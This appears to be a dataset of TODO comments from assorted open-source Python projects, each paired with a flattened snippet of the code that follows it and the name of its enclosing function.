# todo: same code as for batch gradient, but with sum_batch = true </s> def bias(self, module, grad_input, grad_output):	bias shape = module.bias.shape bias_grad = self.bias_jac_t_mat_prod(
# todo: is incref required? </s> context.nrt.incref(builder, arr_typ, arr)	lower_box_df else: arr_obj = box_array(arr_typ, arr, c) name_str = context.insert_const_string(c.builder.module, cname) cname_obj = pyapi.string_from_string(name_str)
# todo this is ideal for threading. </s> for hostname in hive_names:	refresh def refresh (hive, hive_names, timeout=0.5): hive[hostname].expect([pexpect.TIMEOUT,pexpect.EOF],timeout=timeout)
return [] # todo: look at htmlify.py </s> def annotations_by_line(self):	annotations_by_line
# todo(dcramer): this doesnt handle concurrency </s> group = testgroup(	_get_or_create_test_groups def _get_or_create_test_groups(self): build=self.build, project=self.build.project,
# todo: mac os handling </s> return text	restoreLinebreaks if sys.platform=='win32': return text.replace('\n', '\r\n')
# todo: revision 5 </s> paddingstring = '\x28\xbf\x4e\x5e\x4e\x75\x8a\x41\x64\x00\x4e\x56\xff\xfa\x01\x08\x2e\x2e\x00\xb6\xd0\x68\x3e\x80\x2f\x0c\xa9\xfe\x64\x53\x69\x7a'	computeOwnerPass @param revision: The algorithm revision @return: The computed password in string format keyLength = keyLength/8 lenPass = len(ownerPassString)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: manage exceptions when parameters cannot be decoded. </s> score_type_parameters = json.loads(task.score_parameters)	get_score_type task = submission.task score_type_name = task.score_type public_testcases = [testcase.public for testcase in task.testcases]
lambda responses: responses,  # todo </s> 'hiwpd'	get_holdings touchdown_point=touchdown, ), ) holdings = []
# todo: candidate for move to system/hdparm </s> out, err, rc = run_command(	get_disk_power_status :return: single word sting of state as indicated by hdparm -C /dev/<disk> and if we encounter an error line in the output we return unknown. [HDPARM, '-C', '-q', '/dev/disk/by-id/%s' % dev_byid], throw=False) if len(err) != 1:
# todo: use initializer_list<k> and initializer_list<v> perhaps?  do </s> if 0:	visit_dict_expr self.write('new %s(' % c_type) if o.items: self.write('{') for i, item in enumerate(o.items):
# todo: test this </s> style = element.style	handle_computed_font_weight def handle_computed_font_weight(element): Handle keyword values for font-weight. value = get_value(style, 'font-weight') if value == 'normal':
# todo candidate for move to system/osi as not btrfs related </s> smap = {	convert_to_KiB def convert_to_KiB(size): 'KiB': 1, 'MiB': 1024,
# todo:  we might need additional logic comparing the state of git-annex </s> pblshd = ds.repo.copy_to(files=paths,	_publish_dataset lgr.debug("Invoking copy --auto") annex_copy_options += ' --auto' remote=remote, options=annex_copy_options)
# todo: /data/local/tmp might not be execuable and atx-agent can be somewhere else </s> device.shell_output("/data/local/tmp/atx-agent", "server", "-d")	connect_usb warnings.warn("backend atx-agent is not alive, start again ...", RuntimeWarning) deadline = time.time() + 3 while time.time() < deadline:
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: this is not thread-safe! </s> logging.warning('status: reparsing all transactions.')	reparse def reparse (db, block_index=None, quiet=False): to the end of that block. cursor = db.cursor() if block_index:
# todo: fix this, this is one of the few cases where using the config </s> runner_name = self.config.get('test_runner', 'runner')	create_test_suite if not refs: refs = self.config.get('nrun.references') try: if runner_name == 'nrunner':
# todo(mitmul): remove this when cupy.random.choice becomes available </s> bg_inds = cuda.to_cpu(bg_inds)	__call__ n_bg_rois_per_image = min(n_bg_rois_per_image, bg_inds.size) if bg_inds.size > 0: bg_inds = np.random.choice( bg_inds, size=n_bg_rois_per_image, replace=False)
# todo implement this function </s> return	add_contact :param email: :return:
# todo: put this into timeframegroup. #316 </s> for timeframe in timeframes:	split_timeframes def split_timeframes(timeframes, duration_threshold): for split in timeframe.split(duration_threshold): yield split
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
# todo: fix </s> c.pyapi.incref(val)	box_re_pattern @box(RePatternType) def box_re_pattern(typ, val, c): return val
except exception:  # todo: what could happen here? </s> pass	run if self.ws.sock: self.ws.sock.close() self.ws = None
""" todo(datapipe-1525): this fixture override the `mock_source_cluster_name` </s> fixture present in conftest.py	mock_source_cluster_name @pytest.fixture def mock_source_cluster_name(self): return 'yelp_main'
except exception as e:  # todo: do not use bare except </s> attemptcount = '{0}/{1}'.format(retrycount + 1, ipfsretrycount)	pushToIPFS print('Run "ipfs daemon" in another terminal session.') sys.exit() logError('IPFS failed to add, ' + 'retrying attempt {0}'.format(attemptCount))
# todo: maybe could be simplified using contexts </s> dst_units = self.__require_units[uf.__name__]	__array_wrap__ mobjs = None if uf.__name__ in self.__require_units: if dst_units == 'radian': mobjs = []
# todo: save the new xml to the database </s> form_attachment_xml_new = xmltodict.unparse(form_attachment_dict)	replace_username_in_xml form_attachment_dict["data"]["n0:meta"]["n0:username"] = new_username
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> errorresponse = {	test_oauth_error @httpretty.activate def test_oauth_error(self): 'error' : 'invalid_client', 'error_description' : 'This is a test error description',
# todo: look at the model to see which revision is last. </s> offset = url_for(controller='revision', action='list')	test_list_format_atom revisions = model.repo.history().all() revision1 = revisions[0] res = self.app.get(offset + '?format=atom') print res
# todo: remove this (ssh_user is a legacy arg) </s> user = _user_or_ssh_user(user, ssh_user)	download + ssh_keyscan: execute ``ssh.keyscan`` before uploading the file local_filename = local_filename or filename local_file_info = host.fact.file(local_filename) if local_file_info is False:
# todo: don't add output_type in dry_run mode? </s> output_type = index.products.add(output_type)	ingest_cmd output_type = morph_dataset_type(source_type, config) _LOG.info('Created DatasetType %s', output_type.name) tasks = find_diff(source_type, output_type, index) _LOG.info('%s tasks discovered', len(tasks))
# todo(ahundt) add weight loading </s> return model	Atrous_DenseNet use_bias=False)(x) model = Model(img_input, x, name='Atrous_DenseNet')
# todo some complication with -1 label </s> continue	test_classifiers_input_shapes continue if name in ["MultinomialNB", "LabelPropagation", "LabelSpreading"]: with warnings.catch_warnings(record=True): classifier = Classifier()
"""todo: add documentation""" </s> commit = jsonapi.deduce("v1/commits", parameters)	multiple @staticmethod def multiple(parameters): if commit is None: raise jsonapi.UsageError(
# todo: reformat or delete </s> camera.trackbodyid = 0	sawyer_xyz_reacher_camera def sawyer_xyz_reacher_camera(camera): camera.distance = 1.0 cam_dist = 0.3
#todo: get darknet class number from class file </s> num_classes_coco = 80	custom_yolo_spp_body pre-trained weights from darknet and fit for our target classes.''' base_model = yolo_spp_body(inputs, num_anchors, num_classes_coco) base_model.load_weights(weights_path, by_name=True)
# todo: enable custom config </s> if base.lower() != e['word'][0:len(base)].lower():	_refresh_completions if 'menu' not in e: e['menu'] = self._sources[name].get('abbreviation','') continue tmpmatches.append(e)
# todo: surface user-facing error here </s> return ''	resolve_runConfigYaml ) if run_config is None: return yaml.dump(run_config, default_flow_style=False)
# todo handle bad type </s> if type != none:	sharedproperty value = self.extra_props[name] del self.extra_props[name] value = type(value) self.__dict__[name] = value
# todo refactor this to use one code path for all lists </s> exploitdb_names = none	parse_exploits def parse_exploits(): exploitdb_map = None if os.path.exists('nvd/exploitdb.lst'):
# todo find a better way to set up these defaults </s> args.verbose = false	test_library_update conf = Config(file=tcf) args = Namespace() args.monochrome = False args.cores_root = []
pass # todo </s> def handle_request(self, input):	handle_request
#todo: check the data! e.g. pubdate etc. </s> count = 0	test_yql pipe_def = self._get_pipe_def("pipe_80fb3dfc08abfa7e27befe9306fc3ded.json") p = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def) for i in p: count += 1
# todo: remove all elements of the list and remove the blacklist </s> blacklist = [	test_no_tf_control_dependencies def test_no_tf_control_dependencies(): "tensorflow_addons/layers/wrappers.py", "tensorflow_addons/image/utils.py",
# todo: add permissions </s> except exception:	MusicBot entries_added = await player.playlist.async_process_youtube_playlist( playlist_url, channel=channel, author=author) traceback.print_exc() raise exceptions.CommandError('Error handling playlist %s queuing.' % playlist_url, expire_in=30)
@pytest.mark.skip()  # todo: fix this </s> rtmclient._callbacks = collections.defaultdict(list)	tearDown def tearDown(self):
# todo change this to a class. </s> def progress_meter(current_step , target_step):	progress_meter Progress meter for tracking long jobs percentage_progress = ( float(current_step) / float(target_step) ) * 100.
# todo check magic class methods and return them also </s> result = add_results(get_scopes_for_name(scope, current))	filter_result result = [] else: return result
# todo(nnorwitz): enable test. </s> self.assertequal(['const', 'volatile'], modifiers)	testSimpleModifiers self.assertEqual([], templated_types)
# todo: remove print </s> print 'reading: {}'.format(doc.pod_path)	add_all_docs print 'Skipping: {}'.format(doc.pod_path) continue if not concrete and doc.collection_sub_path_clean in doc_basenames: continue
# no todo item selected </s> pass	_complete_selected_item text_type(self.view.todolist.number(todo)))) except AttributeError:
# todo: really dirty. figure out a better way. </s> new_trades = [x for x in new_trades if x.identifier not in all_set]	query_location_trades only_cache=only_cache, ) location_trades.extend(new_trades) trades: TRADES_LIST = []
# todo(b/141243467) remove these workarounds. </s> stack.enter_context(_eager_initial_values())	wrapper def wrapper(*args, **kwargs): with contextlib.ExitStack() as stack: stack.enter_context(tf.variable_creator_scope(_eager_variable_creator)) return f(*args, **kwargs)
# todo: use triple factory </s> batch_size = 16	test_distmult model = DistMult(triples_factory=self.factory) self.assertIsNotNone(model) triples = torch.zeros(batch_size, 3, dtype=torch.long) scores = model.forward_owa(triples)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: confirm necessity of this session clearing and lay out mechanics. </s> tuf.download._sessions = {}	test_https_connection try: os.environ['REQUESTS_CA_BUNDLE'] = bad_cert_fname logger.info('Trying HTTPS download of target file: ' + bad_https_url) with self.assertRaises(requests.exceptions.SSLError):
# todo: initialize config in a unified place </s> self.session_config = config(session_config).extend(base_session_config)	ExpSenderWrapperSSAR Default sender configs are in BASE_SESSION_CONFIG['sender'] super().__init__(env) self.learner_config = Config(learner_config).extend(BASE_LEARN_CONFIG) self.sender = ExpSender(
assert study_id == 0  # todo </s> trial_id = len(self.trials)	create_new_trial_id def create_new_trial_id(self, study_id): self.trials.append(trial.Trial(trial_id)) return trial_id
# todo: store this data </s> p, h, g, d, comment = match.groups()	_parse_data_extension match = re.match(r'^PHG(\d)(\d)(\d)(\d)(.*)$', data) if match: errors.append('PHG parsing not implemented') return comment
# todo: this can permit a failing program to run by eliminating </s> rval = node.op(node.inputs[0].owner.inputs[0], node.inputs[1])	f if not opt.check_chain(node, op, op): return False
# todo: return annexrepo instead if there is one </s> self._repo = annexrepo(self._path, create=false, init=false)	repo if self._repo is None: try: except (InvalidGitRepositoryError, NoSuchPathError): pass
# todo: use an "event" subcase of subject </s> new_study_event = studyevent(self._domain, item.study_event_oid, date)	get_study_event current_study_event = self.data[item.study_event_oid][-1] if current_study_event.is_repeating and current_study_event.date != date: self.data[item.study_event_oid].append(new_study_event) return new_study_event
# todo: handle agg_columns. </s> kdf = kdf[	apply for i in range(len(self._groupkeys)) ] [s.rename(label) for s, label in zip(self._groupkeys, groupkey_labels)] + [kdf._kser_for(label) for label in kdf._internal.column_labels]
# todo: support for 'file' type </s> raise swaggererror('unknown type {0} for value {1}'.format(obj_type, value))	marshal_schema_object if obj_type == 'object': return marshal_object(swagger_spec, schema_object_spec, value)
# todo: series support is not implemented yet. </s> def transform(self, func):	GroupBy sdf=sdf, data_columns=return_schema.fieldNames(), index_map=[])  # index is lost. return DataFrame(internal) Apply function column-by-column to the GroupBy object. The function passed to `transform` must take a Series as its first
# todo: python-components: for now, we call each preprocessor's graph_fn directly. </s> if self_.backend == "python" or get_backend() == "python":	method def method(self_, *inputs): result = inputs for sub_component in self_.sub_components.values(): result = getattr(sub_component, "_graph_fn_"+components_api_method_name)(*force_tuple(result))
# todo expand the policy before checking if the sts:assumerole action is allowed </s> if action == "sts:assumerole":	load_group_policies if not action: continue if statement["Effect"] == "Allow": role_arns = statement["Resource"]
#todo wrap the lp api or use library </s> owner, ppa_name = url.split('/')[3:5]	process_data if not key_fingerprint: try: lp_url = 'https://launchpad.net/api/beta/~%s/+archive/%s' % (owner, ppa_name) req =  Request(lp_url)
# todo: make it optional </s> penalty = self.regularizer.regularizer.compute_penalty_uniform(model=self.model)	train_one_epoch loss_params['mask_index'] = self.mask_index loss = self.loss.loss(**loss_params) loss_batch = loss.item() + penalty.item() running_loss += (loss_batch - running_loss) / (batch_index + 1)
# todo: use dictfield and listfield to do validation </s> if (isinstance(data, dict) and	create_data_is_valid @staticmethod def create_data_is_valid(data): set(data.keys()).issubset(create_ops)): return True
# todo: check output </s> output = run_model(prob)	test_hierarchy_iprint2 prob.setup(check=False)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_end def test_end(self): Scanning the Tangle for all transfers, with end index.
# todo better to write a separate function for this </s> return len(self.get_reduced_simplex(point, simplex, eps)) > 0	point_in_simplex return len(self.get_reduced_simplex(point, simplex, eps)) > 0 else:
# todo(pep612): fix for paramspectype </s> if isinstance(tdef, paramspectype):	erase_def_to_union_or_bound def erase_def_to_union_or_bound(tdef: TypeVarLikeType) -> Type: return AnyType(TypeOfAny.from_error) assert isinstance(tdef, TypeVarType)
# todo it seems that yahoo! converts relative links to absolute </s> if context.verbose:	pipe_fetchpage content = unicode(request.read(), request.headers['content-type'].split('charset=')[-1]) print "............FetchPage: content ................." print content.encode("utf-8")
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo: deprecation warning </s> queryset = queryset.filter(pk=pk)	get_object queryset = queryset.filter(**{self.lookup_kwarg: lookup}) elif pk is not None: elif slug is not None: queryset = queryset.filter(**{self.slug_field: slug})
# todo: in the future we will log the trace </s> raise azureexception('{}: {}'.format(ex.__class__.__name__, ex.args[0]))	_perform_request raise AzureException else: return resp
# todo: write this in human </s> paths = ['/'.join(['..']*(len(crumbs)-2-i)) for i in range(len(crumbs[:-2]))] + ['.', '#']	render_listing title = os.path.basename(in_name) crumbs = out_name.split(os.sep)[1:-1] + [title] context = { 'code': code,
# todo: remove this patching when the `content` property is supported. </s> with monkeypatch_validation(validate_content):	test_page @suite.test def test_page(): document = parse_html('doc1.html', user_stylesheets=[ cssutils.parseString(u"""
# todo retry connects </s> s.connect((self.host, self.port))	__getitem__ def __getitem__(self, key): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.sendall(pickle.dumps(TCPStore.Get(key))) data = s.recv(1024)
# todo: ensure that if multiple flags are provided, the *last* one overrides </s> pwd = os.path.realpath(dest_dir) if arg.p else dest_dir	Cd util.error("cd %r: %s", dest_dir, os.strerror(e.errno)) return 1 state.SetGlobalString(mem, 'PWD', pwd) dir_stack.Reset()  # for pushd/popd/dirs
except exception:  # todo: be specific </s> icap = false	parse_insta_json icap = icap.replace('\n', ' ') icap = (icap[:256] + u'…') if len(icap) > 256 else icap if ivideo is True: botmessage = "[insta] Video by "
#todo: check the data! </s> count = 0	test_urlbuilder pipe_def = self._get_pipe_def("pipe_e519dd393f943315f7e4128d19db2eac.json") p = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def) for i in p: count += 1
# todo: try/except these calls </s> png = decodestring(data['image/png'])	_handle_pyout self._append_plain_text(self.output_sep) self._append_html(self._make_out_prompt(prompt_number)) self._append_png(png) self._append_html(self.output_sep2)
# todo: need to deterministically set to polynomial fitter </s> self.viewer.add_data(self.data)	test_collapse def test_collapse(self): image_viewer = self.app.new_data_viewer(ImageViewer) image_viewer.add_data(self.data)
#ack = self.serial_port.read() # todo: use ack </s> self.sendcommand(137) # 10001001	SetMotorCCW def SetMotorCCW(self):
# todo: implement me </s> pass	enable_subtitle_track def enable_subtitle_track(self, track):
assert study_id == 0  # todo(akiba) </s> trial_id = len(self.trials)	create_new_trial_id def create_new_trial_id(self, study_id): self.trials.append(trial.Trial(trial_id)) return trial_id
# todo: compute bezier curve. </s> anchors = self._get_anchors()	_get_bbox def _get_bbox(self): if not anchors or len(anchors) < 2: return BBox(0, 0, self._psd.width, self._psd.height)
'ms_ssim': false,  # todo: enable fixed_ms_ssim </s> 'n_threads': 4,	test_run_vmafrc_runner_n_threads 'psnr': True, 'ssim': True, } )
# todo: also preserve __module__, __name__ and a few other important attrs </s> return new_fn	coverage return fp(*args, **kw) new_fn.__doc__ = fn.__doc__
# todo(mottodora): add reduce option </s> if self.ignore_nan:	forward_cpu self.retain_inputs((0, 1)) diff = (inputs[0] - inputs[1]).ravel() diff[numpy.isnan(diff)] = 0. return numpy.array(diff.dot(diff) / diff.size, dtype=diff.dtype),
pass  # todo... </s> def c_code(self, node, name, inputs, outputs, sub):	c_code
# todo: we could find a way to handle this. </s> if full_name in pre_modules:	onModuleDiscovered pre_code, reason = self.createPreModuleLoadCode(module) if pre_code: sys.exit("Error, conflicting plug-ins for %s" % full_name) info("Injecting plug-in based pre load code for module '%s':" % full_name)
pass # todo </s> def handle_request(self, input):	handle_request
#todo: info page, test other objs </s> shutil.rmtree(corp_dir)	test_7 if os.path.isdir(corp_dir):
time.sleep(1)  # todo: avoid race conditions in other way </s> self.server_thread.start()	setUp target=self.server.handle_request)
# todo: handle multiple skip stacks </s> (skip, skip_stack), = skip_stack.items()	block_container_layout first_letter_style = getattr(box, 'first_letter_style', None) else: first_letter_style = None for index, child in enumerate(box.children[skip:], start=(skip or 0)):
raise notimplementederror # todo </s> def earliest_offsets(self):	earliest_offsets
# todo: process form submission </s> return render_template("admin_edit_user.html", user=user)	admin_edit_user def admin_edit_user(user_id): user = Journalist.query.get(user_id)
if isinstance(err, asyncio.cancellederror):  # todo: remove when updated to 3.8 </s> raise	TestStreamManager await self.stream_manager.download_stream_from_uri(self.uri, self.exchange_rate_manager, timeout) except Exception as err: error = err self.assertEqual(expected_error, type(error))
# todo(shoyer): test fails on tpu </s> if jtu.device_under_test() == "tpu":	test_root_scalar def test_root_scalar(self): raise SkipTest("Test fails on TPU") def scalar_solve(f, y):
# todo is this still needed? </s> def copytree(src, dst, symlinks=false, ignore=none):	copyTree Symlinks and ignore can be specified according to the usage of `shutil.copytree` and `shutil.copy2`.
# todo consider more type conversions? </s> if value.isdigit():	capture_tileset name = p.attrib['name'] value = p.attrib['value'] value = int(value) tile.properties[name] = value
# todo counts as yes if vhnd was not available </s> return len([c for c in self.cases if c.preg_received_ifa])	ifa_tablets @property def ifa_tablets(self):
pass  # todo... </s> beam_out[0] = beam	perform beam = beam_trans.transpose(*map(array_trans_dims_order.index, range(array.ndim))) if self.wrap_mode == "pad_zero":
# todo: improve performance, get rid of unfold </s> return jac_t_mat	bias_jac_t_mat_prod jac_t_mat = mat.view(shape).sum([0, 2])
# todo: this output will break output formats such as json </s> warnings.warn('{0}: {1}'.format(err.path, err.cause), importwarning)	get_suppressions file_contents = encoding.read_py_file(abspath).split('\n') except encoding.CouldNotHandleEncoding as err: continue ignore_file, ignore_lines = get_noqa_suppressions(file_contents)
# todo: this should take a vector </s> def mfrhoderiv(self, u, v, adjoint=false):	MfRhoDeriv Derivative of :code:`MfRho` with respect to the model. if self.rhoMap is None:
# todo: handle requests with cookies (e.g. s3 pre-signed urls). </s> try:	inspect_sparkle_feed_url except HTTPError as err: if err.code == 403: raw_xml = useragent_urlopen(checked_url, "Mozilla/5.0") facts["user-agent"] = "Mozilla/5.0"
#todo - turn that into a working doctest </s> textkeys = ("id", "pmid", "so", "rf", "ni", "jc", "ta", "is", "cy", "tt",	parse for record in record: print(record['TI']) "CA", "IP", "VI", "DP", "YR", "PG", "LID", "DA", "LR", "OWN", "STAT", "DCOM", "PUBM", "DEP", "PL", "JID", "SB", "PMC",
pass # todo </s> def handle_request(self, input):	handle_request
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
#todo: dont unfold all, but allow enum_all() to work </s> tree_proc(self.tree, tree_item_unfold_deep, 0)	goto_main msg_status('Project not opened') return fn = self.project.get('mainfile', '') if not fn:
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
# todo: verify the length of blockhashes. </s> self._write_file('crypttext_hashes', ''.join(hashes))	remote_put_crypttext_hashes def remote_put_crypttext_hashes(self, hashes): precondition(not self.closed)
# todo: improve this algorithm - maybe fortran/c </s> if nproc >= nsub:	divide_procs iproc = comm.rank nproc = comm.size kwargs = self.kwargs if 'weights' in kwargs and len(kwargs['weights']) == nsub:
# todo: __prepare_scriptable__ was reverted from pytorch: d25061862 </s> model = deepcopy(model)	export_torchscript_with_instances ), "Currently we only support exporting models in evaluation mode to torchscript" from copy import deepcopy for m in model.modules(): for name, subm in m.named_children():
# todo refactoring remove </s> from jedi.evaluate import builtin	load source = f.read() else: return builtin.BuiltinModule(name=path).parser.module p = path or name
# todo: +kwargs </s> else:	_call_gitpy_with_progress with git_repo.git.custom_environment(**GitRepo.GIT_SSH_ENV): ret = callable(**git_kwargs) ret = callable(**git_kwargs) return ret
#todo: dataset/hda by id (from history) or check_ownership for anon user </s> hda = self.get_history_dataset_association( trans, history, id,	show and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history check_ownership=False, check_accessible=True ) else:
# todo: delet this when all preprintproviders have a mapping </s> if sub._id in allowed_parents:	is_valid_subject def is_valid_subject(self, allows_children, allowed_parents, sub): return True if sub.parent:
# todo: move this scopes conversion from and to string into a utils function </s> scopes = scopes.split(" ") if scopes else []	create_authorization_response `client_id`, `state`, `redirect_uri`, `response_type` :param allow: True if the user authorize the client, otherwise False core = self.get_core(request) return core.create_authorization_response(scopes, credentials, allow)
# todo: implement me </s> log.add_msg_contents(msg)	distrib_child_depth def distrib_child_depth(self, msg):
return none  # todo better error handling here </s> session_dict = response.json()	get_authenticated_user except Exception, e: log.error(e) if u'error' in session_dict: log.error("Error when getting authenticated user: %s" % session_dict['error'])
pass # todo </s> def handle_request(self, input):	handle_request
# todo: implement! </s> raise notimplementederror()	_run def _run(self):
# todo: test for the _correct_ revision_id value. </s> if not activity.has_key('revision_id'):	test_remove_tag if not activity.has_key('id'): assert False, "activity object has no id value" assert False, "activity has no revision_id value" timestamp = datetime_from_string(activity['timestamp'])
# todo remove </s> args = parsing.array(parsing.array.tuple, none, values=[])	handle_iterators else: try: generators += \ it.execute_subscope_by_name('__iter__', args)
# todo do something with temp </s> for state, distn in enumerate(self.dur_distns):	resample_dur_distns def resample_dur_distns(self,temp=None): distn.resample_with_truncations( data=
if not self.hoster_url:  #@todo: remove in 0.4.10 </s> return {'validuntil'  : validuntil,	loadAccountInfo leechtraffic = None premium      = None 'trafficleft' : trafficleft, 'leechtraffic': leechtraffic,
# todo: implement </s> pass	hyphenate found.append((tokeniter.cursor(block, token, m.start(), m.end()), m.group())) if not found: if found: import hyphenator
raise mpdnotimplemented # todo </s> def _sticker_delete(self, type, uri, name=none):	_sticker_delete @register(r'^sticker delete "(?P<type>[^"]+)" "(?P<uri>[^"]+)"( "(?P<name>[^"]+)")*$')
# todo(ntonci): add a check for small motion </s> j = i+1	align screw_axis_W_E_i = screw_axis_W_E_i / np.linalg.norm(screw_axis_W_E_i) screw_axis_B_H_i = screw_axis_B_H_i / np.linalg.norm(screw_axis_B_H_i) while j < len(dq_W_E_vec_filtered): dq_W_E_j = dq_W_E_vec_filtered[j]
#@todo: move to utils in 0.4.10 </s> def encode(string, encoding='utf8'):	encode if type(string) is unicode: return string.encode(encoding, "replace")
# xxx todo </s> if args.has_key('done') and args['done']:	__init__ DnsRequest.__init__(self, *name, **args) asyncore.dispatcher_with_send.__init__(self, *name, **args) self.donefunc = args['done'] else:
# todo(nate): temporarily disabled </s> except exception:	process self.logger.warning('manifest.json had wrong step id (build=%s): expected %s but got %s', self.step.job.build_id.hex, self.step.id.hex, contents['job_step_id']) self.logger.exception('Failed to parse manifest.json; (build=%s, step=%s)', self.step.job.build_id.hex, self.step.id.hex)
# todo: here we should check for the leverage based on the config value </s> self.sell_orders[base_asset].append(np.array([order.qty, order.price]))	on_order_submission else:
# todo: candidate for move to system/hdparm </s> hdparm_command = [hdparm, '-q', '-y', '/dev/disk/by-id/%s' % dev_byid]	enter_standby :param dev_byid: device name as stored in db ie /dev/disk/by-id type :return: None or out, err, rc of command return run_command(hdparm_command)
# todo: implement </s> printer = interwibble.urlprinter()	print_pdf def print_pdf(html, filename):
# todo - move or delete </s> matchingmessages.arbitration_id = recv_arb_id	send_and_get_response def send_and_get_response(send_data, send_arb_id, recv_arb_id, number_of_responses=1, timeout_seconds=1): with can_actions.CanActions(arb_id=send_arb_id) as can_wrap: can_wrap.send_single_message_with_callback(data=send_data, callback=callback)
#todo: check if/where this is used; if not used externally - remove </s> return self.marker_detector.inverted_markers	Surface_Tracker @property def inverted_markers(self) -> bool: @inverted_markers.setter def inverted_markers(self, value: bool):
# todo use the faster method </s> translation_project.flush_cache()	handle_all_stores def handle_all_stores(self, translation_project, **options): translation_project.get_stats() translation_project.get_mtime()
pass  # todo - should this do something </s> press "leave domain" on users tab	on_btleavedomain_clicked def on_btleavedomain_clicked(self, widget, data=None):
# todo: i18n plurals </s> raise carterror(_(error_messages['max_items']) % (self.event.settings.max_items_per_order,))	_check_max_cart_size not op.position.addon_to_id]) if cartsize > int(self.event.settings.max_items_per_order):
# todo before moving to pyart.io </s> if field_names is none:	read_d3r_gcpex_nc radar : Radar Radar object containing data from ODIM_H5 file. field_names = D3R_FIELD_NAMES
# todo uncomment label and description when they are </s> 'read_only': true,	test_options_instance_view }, 'id': { 'required': False, 'type': 'Integer',
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> tests happy-path followed by an additional call to acquire_token_with_client_credentials that should	test_happy_path_cached_token @httpretty.activate def test_happy_path_cached_token(self): be served from the cache. response_options = { 'noRefresh' : True }
# todo(dcramer): it's a terrible api and realistically we should just be </s> if source.repository.backend == repositorybackend.hg:	build_finished_handler else: vcs.clone() release_id = vcs.run(['log', '-r %s' % (source.revision_sha,), '--limit=1', '--template={rev}:{node|short}']) else:
# todo(pygeos) does not support empty strings, np.nan, or pd.na </s> missing_values = [none]	test_from_wkb assert isinstance(res, GeometryArray) assert all(v.equals(t) for v, t in zip(res, points_no_missing)) if not compat.USE_PYGEOS: missing_values.extend([b"", np.nan])
# todo: post operations should only add to db. </s> action_db = action.add_or_update(action_db)	post POST /actions/ action_db = ActionAPI.to_model(action) return ActionAPI.from_model(action_db)
# todo: make this pretty </s> return httpresponse('error creating pipeline: is the storage server running? please contact administrator.')	storagesetup storage_service.create_pipeline() except: space = storage_service.get_space(access_protocol="FS", path=default_space) if len(space) < 1:
# todo implement this method </s> :return:	send_event :param event: the event to be sent
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
# todo: untested </s> filelike = bytesio(data)	from_bytes def from_bytes(self, data): self._model.load_state_dict(torch.load(filelike))
# todo: not all values have exact matches in flexget, need to update flexget qualities </s> cp_to_flexget = {'br-disk': 'remux',  # not a perfect match, but as close as currently possible	on_task_input parsedurl.path)) entries = [] '1080p': '1080p', '720p': '720p',
n = 1000  # todo: should scale with radius, dr </s> refx, refy = _points_ring2d(r_edges, dr, n)	pairCorrelationKDTree2D ckdtree = cKDTree(feat[['x', 'y']])  # initialize kdtree for fast neighbor search points = feat.as_matrix(['x', 'y'])  # Convert pandas dataframe to numpy array for faster indexing for idx in p_indices: dist, idxs = ckdtree.query(points[idx], k=max_p_count, distance_upper_bound=cutoff)
pass  # todo - should this do something </s> press "leave domain" on users tab	on_btleavedomain_clicked def on_btleavedomain_clicked(self, widget, data=None):
# todo remove the unstable prefix when servers have updated. </s> self._coro_unstable_event = ijson.kvitems_coro(	__init__ use_float=True, ) _event_parser(self._response.event_dict), prefix + "org.matrix.msc3083.v2.event",
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): def add_scan_id_argument(parser): parser.add_argument(
# todo: test this beam stuff (after you figure out wheter it's sufficient) </s> if elem.get('m21beam') is not none:	chordFromElement if elem.get('grace') is not None: post.duration = duration.GraceDuration(post.duration.quarterLength) if duration.convertTypeToNumber(post.duration.type) > 4: post.beams.fill(post.duration.type, elem.get('m21Beam'))
# todo: assert </s> self.asserttrue(self.remote.copy_profile(profile, "testprofilecopy", self.token))	test_copy_profile Test: copy a profile object profile = self.remote.get_item_handle("profile", "testprofile0", self.token) assert 0
except exception:  # todo - which exceptions? </s> pass	count_selection n = seq.count(nt) self.statistics_ids[nt].configure(text='%s=%d' % (nt, n))
# todo: take namespace into account, currently doesn't matter since </s> with session_scope() as db_session:	body_for_message @jsonify def body_for_message(self, message_id): message = db_session.query(Message).join(Message.parts) \ .filter(Message.id==message_id).one()
# todo find out if this is good because of sparcity... </s> 'prefers_data_normalized': false,	get_meta_information 'handles_numerical_features': True, 'prefers_data_scaled': False, 'handles_multiclass': True, 'handles_multilabel': True,
# todo(blk-u): the following should be </s> self.assertequal(domains[0]['id'], orig_default_domain_id)	BaseLDAPIdentity self.opt_in_group('identity', default_domain_id=new_domain_id) domains = self.assignment_api.list_domains() def test_authenticate_requires_simple_bind(self): user = {
# todo: distributed search messages need to implemented </s> self.logmessage("%s %s" %(msg.__class__, vars(msg)), 4)	ChildDepth def ChildDepth(self, msg):
